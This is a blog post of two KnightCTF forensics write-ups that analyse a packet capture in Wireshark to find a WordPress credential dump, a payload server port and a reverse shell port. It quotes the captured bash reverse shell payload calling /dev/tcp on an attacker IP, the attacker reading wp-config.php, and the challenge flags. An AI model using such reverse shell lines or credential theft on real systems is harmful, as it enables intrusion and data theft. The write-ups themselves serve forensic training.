---
title: 'KnightCTF Writeups'
description: 'having fun'
pubDate: 'Jan 20 2026'
cover: /images/knightctf.png
categories: ['Blog']
tags: ['rev']
---


This CTF was a great experience overall. I played it with Hack@Sec, and we were honestly just chilling and practicing, using these challenges to sharpen our skills and prepare seriously for 2026. Even though the atmosphere was relaxed have fun reading ...





## 1) KCTF – Database Credentials Theft

Category: Forensics 

## 2) Challenge Description

After gaining shell access, the attacker performed post-exploitation and extracted database credentials from the compromised server.

Using **pcap3.pcapng**, recover:

>Database username

>Database password

Flag format:

KCTF{username_password}

## 3) Executive Summary

By reconstructing the reverse shell session over TCP, we observed the attacker dumping a WordPress configuration file, exposing the database credentials.

Recovered:

```bash
Username: wpuser

Password: wp@user123
```

✅ Flag:

```bash
KCTF{wpuser_wp@user123}
```

### Step 1 – Locate Reverse Shell Traffic

Apply filter:

```bash
tcp.port == 9576
```

Right-click a packet →
Follow → TCP Stream

This reconstructs the entire attacker shell session.

### Step 2 – Analyze Post-Exploitation Commands

Inside the stream:

```ruby
www-data@victim:/var/www/html$ ls
index.php wp-config.php ...

www-data@victim:/var/www/html$ cat wp-config.php
```

Captured output:

```ruby
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'wp@user123' );
```

Credentials were transmitted in clear-text.

### Step 3 - Final Flag
 
**KCTF{wpuser_wp@user123}**



 ## 1) KCTF – Post Exploitation

Category: Forensics 


## 2) Challenge Description

After exploiting a vulnerability, the attacker:

>Downloaded an initial payload from an HTTP server

>Established a persistent reverse shell connection

Using **pcap3.pcapng**, identify:

>The HTTP port used for payload delivery

>The port used for the reverse shell

Flag format:

```bash
KCTF{httpPort_revshellPort}

```

 ## 3) Executive Summary

By analyzing suspicious HTTP traffic and long-lived TCP sessions, we identified:

A malicious Python HTTP server delivering a payload on port 8767

A reverse shell connecting back on port 9576

Flag:

```bash
KCTF{8767_9576}
```

### Step 1 – Inspecting the PCAP

Open the capture:

```bash
wireshark pcap3.pcapng
```

Check conversations:

```bash
Statistics → Conversations → TCP
```

Two anomalies appear:

>Short HTTP exchanges on TCP/8767

>A persistent bidirectional session on TCP/9576


### Step 2 – Finding the Payload Server

Apply filter:

```bash
tcp.port == 8767 && http

```

Observed request:

```bash
GET /payload.txt?swp_debug=get_user_options HTTP/1.1
Host: 192.168.1.104:8767

```

Response server:

```bash
SimpleHTTP/0.6 Python/3.13.1

```
Payload content:

```bash
system("bash -c \"bash -i >& /dev/tcp/192.168.1.104/9576 0>&1\"")

```

Confirms malicious payload hosting.

### Step 3 – Identifying the Reverse Shell Port

Filter:

```bash
tcp.port == 9576
```

Follow TCP stream → reveals a fully interactive shell session:

```bash
www-data@victim:/var/www/html$ whoami
www-data
```
Confirms a reverse shell channel.

 Final Flag

 ```bash
KCTF{8767_9576}
```